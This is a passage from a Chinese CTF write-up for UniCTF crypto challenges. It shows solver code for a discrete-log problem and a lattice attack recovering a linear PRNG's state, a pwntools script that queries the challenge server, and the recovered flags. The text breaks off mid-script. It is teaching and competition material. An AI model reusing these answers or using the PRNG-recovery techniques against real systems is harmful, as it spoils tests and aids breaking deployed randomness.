class="string">print(&quot;[*]</span> <span class="string">Search</span> <span class="string">finished.&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="string">if</span> <span class="string">__name__</span> <span class="string">==</span> <span class="attr">&quot;__main__&quot;:</span></span><br><span class="line">    <span class="string">solve()</span></span><br></pre></td></tr></table></figure>

<p> UniCTF{pa3sw0rd_1s_ch2rmin3}   </p>
<h3 id="subgroup-dlp"><a href="#subgroup-dlp" class="headerlink" title="subgroup_dlp"></a>subgroup_dlp</h3><p>题目附件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">flag = b&#x27;UniCTF&#123;???&#125;&#x27;</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n =</span><br><span class="line">20416580311348568104958456290409800602076453150746674606637172527592736894552749500299570715851384304673805100</span><br><span class="line">612931000268540860237227126141075427447627491168</span><br><span class="line">print(pow(7,m,n))</span><br><span class="line"># c =</span><br><span class="line">81952291012287933121605316144877461220562204790814911484551341710512266046322896103797794626282877491200569612</span><br><span class="line">07013231802759766535835599450864667728106141697</span><br></pre></td></tr></table></figure>

<p>dlp问题，可以利用factordb尝试分解n，得到如下结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NjkzMzRkMDcxOWYzYTJiY2I3ZTYxYmRkNzRhN2UxZTdfUXZMM3lERkZzS1VpUEV6VXdyeFk3eHpEUkFPSE4yRm1fVG9rZW46TzhXamJlYUJLb1pCSkd4V3JhWWNyRmV2bkpjXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>对每个素因子的p-1进行分解，发现基本上都是小因子，直接用pohlig-hellman算法求解dlp，最后用crt即可得到结果</p>
<p>对于中间的3次的素因子求dlp，可以用hensel提升将模p下的基础解逐渐往上提升到3次，即可解出</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift</span>(<span class="params">g, c, p</span>):</span><br><span class="line">m = discrete_log(GF(p)(c), GF(p)(g))</span><br><span class="line">o = GF(p)(g).multiplicative_order()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">pi, ni = p**i, p**(i+<span class="number">1</span>)</span><br><span class="line">k = ((c * <span class="built_in">pow</span>(<span class="built_in">pow</span>(g, m, ni), -<span class="number">1</span>, ni) - <span class="number">1</span>) // pi * <span class="built_in">pow</span>((<span class="built_in">pow</span>(g, o, ni) - <span class="number">1</span>) // pi, -<span class="number">1</span>, p)) % p</span><br><span class="line">m += k * o</span><br><span class="line">o *= p</span><br><span class="line"><span class="keyword">return</span> m, o</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mg</span>(<span class="params">rs, ms</span>):</span><br><span class="line">r, m = rs[<span class="number">0</span>], ms[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(rs)):</span><br><span class="line">g, x, _ = xgcd(m, ms[i])</span><br><span class="line">r += ((rs[i] - r) // g * x % (ms[i] // g)) * m</span><br><span class="line">m = (m * ms[i]) // g</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line">c, g =</span><br><span class="line"><span class="number">81952291012287933121605316144877461220562204790814911484551341710512266046322896103797794626282877491200569612</span></span><br><span class="line">07013231802759766535835599450864667728106141697, <span class="number">7</span></span><br><span class="line">ps = [(<span class="number">2</span>^<span class="number">5</span> * <span class="number">3</span>^<span class="number">2</span>, <span class="number">0</span>), (<span class="number">10711086940911733573</span>, <span class="number">1</span>), (<span class="number">188455199626845780197</span>, <span class="number">3</span>),</span><br><span class="line">(<span class="number">988854958862525695246052320176260067587096611000882853771819829938377275059</span>, <span class="number">1</span>)]</span><br><span class="line">rs, ms = [], []</span><br><span class="line"><span class="keyword">for</span> p, e <span class="keyword">in</span> ps:</span><br><span class="line"><span class="keyword">if</span> e == <span class="number">3</span>:</span><br><span class="line">r, o = lift(g, c, p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">R = IntegerModRing(p)</span><br><span class="line">r, o = discrete_log(R(c), R(g)), R(g).multiplicative_order()</span><br><span class="line">rs.append(r); ms.append(o)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(mg(rs, ms))))</span><br><span class="line">UniCTF&#123;Th1s_DLP_probl3m_i5_v3ry_s1mpl3_f0r_y0u!!!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="subgroup-lattice"><a href="#subgroup-lattice" class="headerlink" title="subgroup_lattice"></a>subgroup_lattice</h3><p>题目附件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> C</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># import pty</span></span><br><span class="line">flag = os.getenv(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;test&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, state</span>):</span><br><span class="line"><span class="variable language_">self</span>.mask = <span class="number">2147483647</span></span><br><span class="line"><span class="variable language_">self</span>.state = [s &amp; <span class="variable language_">self</span>.mask <span class="keyword">for</span> s <span class="keyword">in</span> state]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.state)):</span><br><span class="line">tmp = (tmp + <span class="variable language_">self</span>.state[i] * C[i]) % <span class="variable language_">self</span>.mask</span><br><span class="line"><span class="variable language_">self</span>.state = <span class="variable language_">self</span>.state[<span class="number">1</span>:] + [tmp]</span><br><span class="line"><span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">self, k</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>.<span class="built_in">next</span>() &gt;&gt; (<span class="variable language_">self</span>.mask.bit_length() - k)</span><br><span class="line">banner = <span class="string">&quot;&quot;&quot;===FLAG MANAGEMENT SYSTEM===</span></span><br><span class="line"><span class="string">[1] Get Flag</span></span><br><span class="line"><span class="string">[2] Get Hint</span></span><br><span class="line"><span class="string">[3] Exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">s = [getrandbits(<span class="number">30</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">prng = PRNG(s)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">op = <span class="built_in">input</span>(banner + <span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> op == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">ans = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please enter the answer: &quot;</span>))</span><br><span class="line"><span class="keyword">if</span> ans == <span class="built_in">sum</span>(s):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Congratulations, this is your flag:&quot;</span>, flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Unfortunately, the answer is incorrect...&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> op == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">hint = prng.getrandbits(<span class="number">17</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Here is your hint: <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> op == <span class="string">&quot;3&quot;</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Goodbye!&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NO!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Something wrong...&quot;</span>)</span><br><span class="line">exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>论文题，考的是MRG，参考论文如下：</p>
<p><a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://eprint.iacr.org/2022/1134&ved=2ahUKEwidquDkn">https://www.google.com/url?sa=t&amp;source=web&amp;rct=j&amp;opi=89978449&amp;url=https://eprint.iacr.org/2022/1134&amp;ved=2ahUKEwidquDkn</a></p>
<p>7WSAxXwh68BHSd0GYAQFnoECCQQAQ&amp;sqi&#x3D;2&amp;usg&#x3D;AOvVaw0na3cgHCkj3AD2NtY19N5v</p>
<p>论文中，初始值的高位也是已知的，但是在这个题目中有一点不同，hint值并不是从第一个初始值的高位开始输出的，而是从第16个初始值</p>
<p>的高位开始输出，不过我们可以把hint[16]-hint[31]视作新的初值，然后往后面取足够多的值，就和论文的情况几乎一样了，即可恢复出c和</p>
<p>hint[16]-hint[31]的值，然后往前推出初值：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MzEzOTAzMmIxMmJkMDk2MjZmOTRiOGE0ZGZiZWI1N2ZfUVhZUmRvTGdvUnZ4elM4UU5vZHpMdExjSUdsWFdQS3RfVG9rZW46Rzl3M2JUTHlWb2oyVXN4Z2NiN2NGRHpmblFoXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>最后把初值求和即可</p>
<p>论文作者在论文里给出了代码地址，不过是C++实现的，直接改为sage即可</p>
<p>exp1</p>
<p>先收集数据，收集结束后不退出，等待后面输入，求出结果后然后进行交互得到flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">40041</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hint</span>():</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Here is your hint: &quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">hints = []</span><br><span class="line">log.info(<span class="string">&quot;Collecting hints...&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">250</span>):</span><br><span class="line">h = get_hint()</span><br><span class="line">hints.append(h)</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Collected <span class="subst">&#123;i&#125;</span> hints...&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hints_data.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(<span class="built_in">str</span>(hints))</span><br><span class="line">log.success(<span class="string">&quot;Data saved to hints_data.txt!&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;WAITING FOR YOUR SAGE CALCULATION...&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>exp2:</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">import</span> <span class="string">time</span></span><br><span class="line"><span class="string">from</span> <span class="string">sage.all</span> <span class="string">import</span> <span class="string">*</span></span><br><span class="line"><span class="string">n</span> <span class="string">=</span> <span class="number">16</span></span><br><span class="line"><span class="string">r</span> <span class="string">=</span> <span class="number">175</span></span><br><span class="line"><span class="string">t</span> <span class="string">=</span> <span class="number">65</span></span><br><span class="line"><span class="string">N_val</span> <span class="string">=</span> <span class="string">r</span> <span class="string">+</span> <span class="string">t</span> <span class="bullet">-</span> <span class="number">1</span></span><br><span class="line"><span class="string">alpha</span> <span class="string">=</span> <span class="number">17</span></span><br><span class="line"><span class="string">beta</span> <span class="string">=</span> <span class="number">14</span></span><br><span class="line"><span class="string">Y_raw</span> <span class="string">=</span> [<span class="number">96446</span>, <span class="number">40430</span>, <span class="number">860</span>, <span class="number">127043</span>, <span class="number">35009</span>, <span class="number">89593</span>, <span class="number">99509</span>, <span class="number">22647</span>, <span class="number">1316</span>, <span class="number">109213</span>, <span class="number">11800</span>, <span class="number">28240</span>, <span class="number">69354</span>, <span class="number">109122</span>,</span><br><span class="line"><span class="number">22227</span>, <span class="number">24184</span>, <span class="number">87916</span>, <span class="number">41485</span>, <span class="number">20961</span>, <span class="number">47239</span>, <span class="number">95462</span>, <span class="number">55570</span>, <span class="number">121152</span>, <span class="number">46876</span>, <span class="number">53677</span>, <span class="number">47472</span>, <span class="number">23642</span>, <span class="number">59591</span>, <span class="number">92742</span>,</span><br><span class="line"><span class="number">126250</span>, <span class="number">67487</span>, <span class="number">38529</span>, <span class="number">79596</span>, <span class="number">90468</span>, <span class="number">32930</span>, <span class="number">94435</span>, <span class="number">24161</span>, <span class="number">87317</span>, <span class="number">58541</span>, <span class="number">13679</span>, <span class="number">93795</span>, <span class="number">15318</span>, <span class="number">41016</span>, <span class="number">70390</span>,</span><br><span class="line"><span class="number">25790</span>, <span class="number">21741</span>, <span class="number">13874</span>, <span class="number">18670</span>, <span class="number">6873</span>, <span class="number">106666</span>, <span class="number">118087</span>, <span class="number">77077</span>, <span class="number">41991</span>, <span class="number">31423</span>, <span class="number">38044</span>, <span class="number">102022</span>, <span class="number">32175</span>, <span class="number">7002</span>, <span class="number">69734</span>, <span class="number">357</span>,</span><br><span class="line"><span class="number">5519</span>, <span class="number">65676</span>, <span class="number">85113</span>, <span class="number">92531</span>, <span class="number">87736</span>, <span class="number">102251</span>, <span class="number">90660</span>, <span class="number">39291</span>, <span class="number">43818</span>, <span class="number">112055</span>, <span class="number">35383</span>, <span class="number">46295</span>, <span class="number">54355</span>, <span class="number">115057</span>, <span class="number">19749</span>,</span><br><span class="line"><span class="number">15457</span>, <span class="number">61131</span>, <span class="number">50398</span>, <span class="number">34381</span>, <span class="number">94845</span>, <span class="number">32810</span>, <span class="number">18364</span>, <span class="number">10933</span>, <span class="number">24136</span>, <span class="number">55795</span>, <span class="number">59206</span>, <span class="number">119190</span>, <span class="number">97787</span>, <span class="number">34025</span>, <span class="number">102498</span>,</span><br><span class="line"><span class="number">8556</span>, <span class="number">121587</span>, <span class="number">15189</span>, <span class="number">75681</span>, <span class="number">47242</span>, <span class="number">36851</span>, <span class="number">53420</span>, <span class="number">11753</span>, <span class="number">83335</span>, <span class="number">18234</span>, <span class="number">48283</span>, <span class="number">104191</span>, <span class="number">119193</span>, <span class="number">49405</span>, <span class="number">78994</span>,</span><br><span class="line"><span class="number">118084</span>, <span class="number">54089</span>, <span class="number">87065</span>, <span class="number">51910</span>, <span class="number">112087</span>, <span class="number">46969</span>, <span class="number">24665</span>, <span class="number">41412</span>, <span class="number">109000</span>, <span class="number">4046</span>, <span class="number">124429</span>, <span class="number">113086</span>, <span class="number">111458</span>, <span class="number">45353</span>, <span class="number">61539</span>,</span><br><span class="line"><span class="number">45248</span>, <span class="number">99404</span>, <span class="number">16558</span>, <span class="number">93659</span>, <span class="number">113884</span>, <span class="number">116978</span>, <span class="number">5106</span>, <span class="number">75982</span>, <span class="number">56197</span>, <span class="number">38021</span>, <span class="number">13469</span>, <span class="number">42985</span>, <span class="number">88012</span>, <span class="number">77690</span>, <span class="number">45279</span>,</span><br><span class="line"><span class="number">17185</span>, <span class="number">43184</span>, <span class="number">74120</span>, <span class="number">74431</span>, <span class="number">65299</span>, <span class="number">111734</span>, <span class="number">34765</span>, <span class="number">121852</span>, <span class="number">41104</span>, <span class="number">123652</span>, <span class="number">38692</span>, <span class="number">113866</span>, <span class="number">8111</span>, <span class="number">48131</span>, <span class="number">70633</span>,</span><br><span class="line"><span class="number">30506</span>, <span class="number">89650</span>, <span class="number">90405</span>, <span class="number">126562</span>, <span class="number">96087</span>, <span class="number">76623</span>, <span class="number">83745</span>, <span class="number">91181</span>, <span class="number">49321</span>, <span class="number">81641</span>, <span class="number">29027</span>, <span class="number">64463</span>, <span class="number">126263</span>, <span class="number">78604</span>, <span class="number">59628</span>,</span><br><span class="line"><span class="number">90063</span>, <span class="number">90800</span>, <span class="number">89305</span>, <span class="number">31109</span>, <span class="number">58731</span>, <span class="number">69156</span>, <span class="number">73736</span>, <span class="number">18662</span>, <span class="number">38392</span>, <span class="number">53609</span>, <span class="number">123588</span>, <span class="number">85664</span>, <span class="number">94194</span>, <span class="number">104988</span>, <span class="number">91151</span>,</span><br><span class="line"><span class="number">109796</span>, <span class="number">81427</span>, <span class="number">101853</span>, <span class="number">60634</span>, <span class="number">129</span>, <span class="number">63227</span>, <span class="number">18453</span>, <span class="number">23037</span>, <span class="number">76810</span>, <span class="number">17256</span>, <span class="number">123434</span>, <span class="number">2805</span>, <span class="number">86705</span>, <span class="number">33835</span>, <span class="number">49566</span>,</span><br><span class="line"><span class="number">58317</span>, <span class="number">114614</span>, <span class="number">6529</span>, <span class="number">125396</span>, <span class="number">75699</span>, <span class="number">4854</span>, <span class="number">103093</span>, <span class="number">77584</span>, <span class="number">84253</span>, <span class="number">57417</span>, <span class="number">67093</span>, <span class="number">130721</span>, <span class="number">5921</span>, <span class="number">11309</span>, <span class="number">26815</span>,</span><br><span class="line"><span class="number">6648</span>, <span class="number">5800</span>, <span class="number">3480</span>, <span class="number">45949</span>, <span class="number">126297</span>, <span class="number">90938</span>, <span class="number">80505</span>, <span class="number">98711</span>, <span class="number">124063</span>, <span class="number">56070</span>, <span class="number">52019</span>, <span class="number">15619</span>, <span class="number">30454</span>, <span class="number">82885</span>, <span class="number">20863</span>, <span class="number">66180</span>,</span><br><span class="line"><span class="number">90906</span>, <span class="number">29950</span>, <span class="number">108627</span>, <span class="number">129937</span>, <span class="number">67875</span>, <span class="number">123055</span>, <span class="number">59924</span>, <span class="number">52110</span>, <span class="number">93076</span>, <span class="number">38243</span>, <span class="number">101543</span>, <span class="number">47748</span>, <span class="number">24373</span>, <span class="number">66348</span>, <span class="number">49548</span>,</span><br><span class="line"><span class="number">35994</span>, <span class="number">51580</span>, <span class="number">64150</span>, <span class="number">58896</span>, <span class="number">21761</span>, <span class="number">108620</span>, <span class="number">112710</span>, <span class="number">80030</span>, <span class="number">11048</span>]</span><br><span class="line"><span class="string">y</span> <span class="string">=</span> <span class="string">vector(ZZ,</span> <span class="string">Y_raw)</span></span><br><span class="line"><span class="string">def</span> <span class="string">Search_linear_relations(y_vec,</span> <span class="string">r,</span> <span class="attr">t):</span></span><br><span class="line"><span class="string">start</span> <span class="string">=</span> <span class="string">time.time()</span></span><br><span class="line"><span class="string">print(&quot;Step</span> <span class="attr">1 Start:</span> <span class="string">Constructing</span> <span class="string">Lattice...&quot;)</span></span><br><span class="line"><span class="string">L</span> <span class="string">=</span> <span class="string">Matrix(ZZ,</span> <span class="string">r,</span> <span class="string">r</span> <span class="string">+</span> <span class="string">t)</span></span><br><span class="line"><span class="attr">for i in range(r):</span></span><br><span class="line"><span class="string">L[i,</span> <span class="string">t</span> <span class="string">+</span> <span class="string">i]</span> <span class="string">=</span> <span class="number">1</span></span><br><span class="line"><span class="attr">for j in range(t):</span></span><br><span class="line"><span class="string">L[i,</span> <span class="string">j]</span> <span class="string">=</span> <span class="string">y_vec[i</span> <span class="string">+</span> <span class="string">j]</span></span><br><span class="line"><span class="string">print(&quot;Running</span> <span class="string">LLL</span> <span class="string">reduction...&quot;)</span></span><br><span class="line"><span class="string">L</span> <span class="string">=</span> <span class="string">L.LLL()</span></span><br><span class="line"><span class="string">print(&quot;Running</span> <span class="string">BKZ</span> <span class="string">reduction</span> <span class="string">(block_size=20)...&quot;)</span></span><br><span class="line"><span class="string">L</span> <span class="string">=</span> <span class="string">L.BKZ(block_size=20)</span></span><br><span class="line"><span class="string">C</span> <span class="string">=</span> <span class="string">Matrix(ZZ,</span> <span class="number">3</span><span class="string">,</span> <span class="string">r)</span></span><br><span class="line"><span class="attr">for i in range(3):</span></span><br><span class="line"><span class="attr">for j in range(r):</span></span><br><span class="line"><span class="string">C[i,</span> <span class="string">j]</span> <span class="string">=</span> <span class="string">L[i,</span> <span class="string">j</span> <span class="string">+</span> <span class="string">t]</span></span><br><span class="line"><span class="string">end</span> <span class="string">=</span> <span class="string">time.time()</span></span><br><span class="line"><span class="string">print(f&quot;Step</span> <span class="attr">1 Done. Time:</span> &#123;<span class="string">end</span> <span class="bullet">-</span> <span class="string">start:.4f</span>&#125;<span class="string">s\n&quot;)</span></span><br><span class="line"><span class="string">return</span> <span class="string">C</span></span><br><span class="line"><span class="string">def</span> <span class="string">Recover_the_modulus(C,</span> <span class="attr">r):</span></span><br><span class="line"><span class="string">m</span> <span class="string">=</span> <span class="number">2147483647</span></span><br><span class="line"><span class="string">print(f&quot;Step</span> <span class="attr">2 (Bypassed): Using known CTF modulus:</span> &#123;<span class="string">m</span>&#125;<span class="string">\n&quot;)</span></span><br><span class="line"><span class="string">return</span> <span class="string">m</span></span><br><span class="line"><span class="string">def</span> <span class="string">Recover_the_coefficients(C,</span> <span class="string">m,</span> <span class="attr">r):</span></span><br><span class="line"><span class="string">start</span> <span class="string">=</span> <span class="string">time.time()</span></span><br><span class="line"><span class="string">R</span> <span class="string">=</span> <span class="string">PolynomialRing(Zmod(m),</span> <span class="string">&#x27;x&#x27;</span><span class="string">)</span></span><br><span class="line"><span class="string">polys</span> <span class="string">=</span> []</span><br><span class="line"><span class="attr">for i in range(2):</span></span><br><span class="line"><span class="string">coeffs</span> <span class="string">=</span> [<span class="string">C</span>[<span class="string">i</span>, <span class="string">j</span>] <span class="string">for</span> <span class="string">j</span> <span class="string">in</span> <span class="string">range(r)</span>]</span><br><span class="line"><span class="string">poly</span> <span class="string">=</span> <span class="string">R(coeffs)</span></span><br><span class="line"><span class="attr">if not poly.is_zero():</span></span><br><span class="line"><span class="string">lc</span> <span class="string">=</span> <span class="string">poly.leading_coefficient()</span></span><br><span class="line"><span class="attr">try:</span></span><br><span class="line"><span class="string">inv_lc</span> <span class="string">=</span> <span class="string">lc.inverse_of_unit()</span></span><br><span class="line"><span class="string">poly</span> <span class="string">=</span> <span class="string">poly</span> <span class="string">*</span> <span class="string">inv_lc</span></span><br><span class="line"><span class="attr">except ZeroDivisionError:</span></span><br><span class="line"><span class="string">pass</span></span><br><span class="line"><span class="string">polys.append(poly)</span></span><br><span 